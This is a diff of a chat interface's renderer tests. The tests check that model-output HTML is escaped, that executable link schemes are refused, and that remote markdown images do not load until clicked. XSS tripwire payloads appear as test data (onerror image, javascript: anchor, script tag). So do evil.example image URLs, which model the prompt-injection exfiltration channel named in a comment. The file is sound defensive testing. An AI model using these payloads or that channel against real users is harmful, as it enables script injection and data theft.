@@ -179,14 +179,10 @@ test('a text part renders through the markdown pipeline inside the prose shell',
 /**
  * The three tripwires the `?fixture` page carries for the human loop
  * (`fixture-conversation.ts`), as markup this file owns: the fixture is reachable only by
- * a human typing `?fixture` and nothing renders it in CI (#233).
- *
- * ⚠ The `javascript:` link is a RAW anchor, not the fixture's `[text](javascript:…)`. Two
- * reasons, both load-bearing: a markdown destination containing spaces is not a link at all
- * (the fixture's reads as literal text in the DOM, so its second tripwire never tests the
- * sanitiser), and only an element `rehype-raw` BUILT can prove when the sanitiser ran.
+ * a human typing `?fixture` and nothing renders it in CI (#233). The `javascript:` link is a
+ * RAW anchor here; the markdown-link form is its own case below.
  */
-const SANITIZE_TRIPWIRES = [
+const RAW_HTML_TRIPWIRES = [
   'SENTINEL-BEFORE',
   '<img src="x" alt="inert tripwire" onerror="alert(\'img handler fired\')">',
   '<a href="javascript:alert(\'link fired\')">this link must be inert</a>',
@@ -195,54 +191,91 @@ const SANITIZE_TRIPWIRES = [
 ].join('\n\n')
 
 /**
- * ⚠ THE ORDER, NOT MERELY THE SANITISING (#233). The chain the vendor builds is
- * `[rehypeRaw, rehypeHighlight, …ours…, rehypeSanitize]` — sanitise LAST, as
- * `chat-screen.tsx` claims — and `rehype-raw` is the plugin that turns raw HTML in model
- * output from a string into real elements. So the markup below is markup an EARLIER
- * transform builds: nothing can strip an `onerror` that does not exist yet.
+ * ⚠ MODEL HTML NEVER BECOMES AN ELEMENT (#233). Model output is untrusted text entering a DOM.
+ * Since `@tanstack/ai-react` 0.25, `TextPart` renders through `@tanstack/markdown`'s streaming
+ * profile: raw HTML is ESCAPED rather than parsed and sanitised, and executable link
+ * destinations are removed. (Before it, the chain was react-markdown with `rehype-raw` and
+ * `rehype-sanitize` LAST, and this test pinned that order.) Markdown's OWN elements — links,
+ * images — still render; what a remote image may fetch is the tests below it.
  *
- * The image and the anchor are therefore asserted as PAIRS — the element `rehype-raw`
- * built is present AND what would execute is gone — and the script, which has no safe
- * residue, is asserted gone tag and body. Measured both ways against the real vendor
- * chain (2026-09-18):
- *
- * - `rehypeSanitize` moved to the FRONT: all three tripwires vanish, because
- *   `hast-util-sanitize` drops `raw` nodes — sanitising before `rehype-raw` DELETES the
- *   model's HTML instead of cleaning it. The presence halves go red.
- * - `rehypeSanitize` dropped from the chain: the `<script>` renders live and the anchor
- *   keeps an `href` attribute. Those two assertions go red.
- *
- * ⚠ REACT IS A SECOND LAYER for two of the three, and this test cannot tell the layers
- * apart: with no sanitiser at all, React still refuses a string `onerror` and empties a
- * `javascript:` href to `href=""`. So the sanitiser-specific evidence is the `<script>`
- * being gone and the anchor arriving with NO href attribute rather than an empty one —
- * which is why `<a>this link must be inert</a>` is asserted whole.
- *
- * A red line here means the sanitize-last claim is false for model output entering the
- * DOM. The expected cause is a dependency bump that reorders the rehype chain — which the
- * gate could not see before this test: the `?fixture` page is the visual loop and nothing
- * runs it in CI.
+ * So the raw tripwires must arrive as visible TEXT — escaped, not eaten, so the reply around
+ * them survives whole — and as no element at all. A red line here means a renderer change
+ * started turning model HTML back into elements: re-read what sanitises them before
+ * re-pinning anything.
  */
-test('⚠ the markdown chain sanitises LAST: raw HTML becomes elements, and what those elements would execute is gone', () => {
-  const rendered = html({ key: 'text', part: { type: 'text', content: SANITIZE_TRIPWIRES } })
+test('⚠ raw HTML in model output renders as escaped text, never as an element', () => {
+  const rendered = html({ key: 'text', part: { type: 'text', content: RAW_HTML_TRIPWIRES } })
 
-  // Sanitising did not eat the message around the tripwires.
   expect(rendered).toContain('SENTINEL-BEFORE')
   expect(rendered).toContain('SENTINEL-AFTER')
-
-  // `rehype-raw` parsed the raw <img> into an element (escaped text would not match) —
-  // and the handler it parsed with it is gone.
-  expect(rendered).toContain('<img src="x"')
-  expect(rendered).not.toContain('onerror')
-
-  // Same for the anchor: the element `rehype-raw` built survives, stripped of the href
-  // whose scheme would run.
-  expect(rendered).toContain('<a>this link must be inert</a>')
-  expect(rendered).not.toContain('javascript:')
-
-  // The script element is dropped whole, body and all.
+  // Visible as the characters the model wrote…
+  expect(rendered).toContain('&lt;img src=&quot;x&quot;')
+  expect(rendered).toContain('&lt;script&gt;')
+  // …and never built: no image, no anchor, no script element.
+  expect(rendered).not.toContain('<img')
+  expect(rendered).not.toContain('<a ')
   expect(rendered).not.toContain('<script')
-  expect(rendered).not.toContain('script executed')
+})
+
+// The markdown-link form of the same tripwire: the destination whose scheme would run is dropped
+// and the text stays, in place. The https link beside it is the control — links render at all, so
+// the absence of the `javascript:` one is the renderer's decision, not a markdown miss.
+test('⚠ a markdown link with an executable destination renders as its text; a https link stays a link', () => {
+  const rendered = html({
+    key: 'text',
+    part: {
+      type: 'text',
+      content: '[run me](javascript:alert(1)) and [data](data:text/html,x) beside [safe](https://example.com)',
+    },
+  })
+  expect(rendered).toContain('run me and data beside <a href="https://example.com">safe</a>')
+  expect(rendered).not.toContain('javascript:')
+  expect(rendered).not.toContain('data:text/html')
+})
+
+// The link filter is an ALLOWLIST (`@tanstack/markdown` `sanitizeUrl`): it strips control
+// characters and whitespace, then keeps only relative, http(s), mailto and tel. So a scheme
+// spelled in mixed case or split by a tab is still refused — a denylist on `javascript:` would pass both.
+test('⚠ a disguised executable scheme is refused too — mixed case, or split by a tab', () => {
+  for (const destination of ['JaVaScRiPt:alert(1)', 'java\tscript:alert(1)']) {
+    const rendered = html({ key: 'text', part: { type: 'text', content: `[inert](${destination})` } })
+    expect(rendered).toContain('inert')
+    expect(rendered).not.toContain('<a')
+  }
+})
+
+/**
+ * ⚠ A REMOTE IMAGE IS NOT FETCHED UNTIL A CLICK (PR #350 review; `markdown-image.tsx`). The
+ * renderer would emit `<img src>` — and React a `<link rel="preload">` — for any http(s) URL,
+ * which the browser requests with no click: the prompt-injection exfiltration channel. So the
+ * reply carries a button naming the host and the full URL, and no element that fetches. The
+ * two relative-LOOKING forms are the ones a pattern check misses: the link filter keeps
+ * anything starting with `/`, and a browser resolves both to another host. The last three pin
+ * that NO host is exempt — not the checker's own placeholder bases, not a reserved `.invalid`
+ * name (a proxy still logs it), not this page's own origin written out absolutely.
+ */
+test('⚠ a remote markdown image renders as a click-to-load button showing the full URL — nothing fetches', () => {
+  for (const [source, host] of [
+    ['https://evil.example/p.png?q=SECRET', 'evil.example'],
+    ['//evil.example/p.png?q=SECRET', 'evil.example'],
+    ['/\\evil.example/p.png?q=SECRET', 'evil.example'],
+    ['http://a.invalid/p.png?q=SECRET', 'a.invalid'],
+    ['https://enso.invalid/p.png?q=SECRET', 'enso.invalid'],
+    ['http://127.0.0.1:5178/p.png?q=SECRET', '127.0.0.1:5178'],
+  ] as const) {
+    const rendered = html({ key: 'text', part: { type: 'text', content: `![chart](${source})` } })
+    expect(rendered).not.toContain('<img')
+    expect(rendered).not.toContain('rel="preload"')
+    expect(rendered).toContain(`aria-label="load image from ${host}"`)
+    expect(rendered).toContain('p.png?q=SECRET')
+  }
+})
+
+// The control: an image on this page's own server leaves nothing, so it renders at once.
+test('a markdown image on this server renders as an <img> immediately', () => {
+  const rendered = html({ key: 'text', part: { type: 'text', content: '![diagram](diagram.png)' } })
+  expect(rendered).toContain('<img alt="diagram"')
+  expect(rendered).toContain('src="diagram.png"')
 })
 
 // The user's image (#68): inline bytes render as the image; a URL source stays visible as data, not fetched.
